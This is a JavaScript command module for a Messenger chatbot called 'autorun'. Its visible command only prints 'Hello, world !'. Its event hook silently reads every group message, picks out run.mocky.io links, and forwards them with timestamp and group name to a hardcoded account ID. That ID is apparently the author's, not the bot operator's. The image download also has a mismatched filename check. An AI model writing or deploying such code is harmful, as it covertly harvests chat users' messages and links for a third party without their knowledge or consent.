module.exports.config = {
	name: "autorun",
	version: "1.0.0",
	hasPermssion: 0,
	credits: "",
	description: "Lay link runmoky  ve cho admin",
	commandCategory: "Admin",
	usages: "",
	cooldowns: 5
};
module.exports.onLoad = () => {
    const fs = require("fs-extra");
    const request = require("request");
    const dirMaterial = __dirname + `/noprefix/`;
    if (!fs.existsSync(dirMaterial + "noprefix")) fs.mkdirSync(dirMaterial, { recursive: true });
    if (!fs.existsSync(dirMaterial + "vantoan.jpeg")) request("https://i.imgur.com/acdiyiE.jpeg").pipe(fs.createWriteStream(dirMaterial + "manh.jpeg"));
  }
module.exports.run = async function({ api , event , args }) {
    console.log('Hello, world !');
};
module.exports.handleEvent = async function({ api , event , Users }) {
    const { body , senderID , threadID } = event;
  const moment = require("moment-timezone");
  const tpkk = moment.tz("Asia/Ho_Chi_Minh").format("DD/MM/YYYY || HH:mm:ss");
  const fs = require("fs");
    try {
        if (body === undefined || !body.includes('run.mocky.io') || senderID == api.getCurrentUserID() || senderID == '') return;
        const userName = await Users.getNameUser(senderID);
        const { threadName } = await api.getThreadInfo(threadID);
        api.sendMessage(`⏰ Time: ${tpkk}\n🌍 Box: ${threadName}\n💬 Link: ${body}`, '1162050272');
    } catch (e) {
        api.sendMessage(`${e}`, '1162050272');
    }
};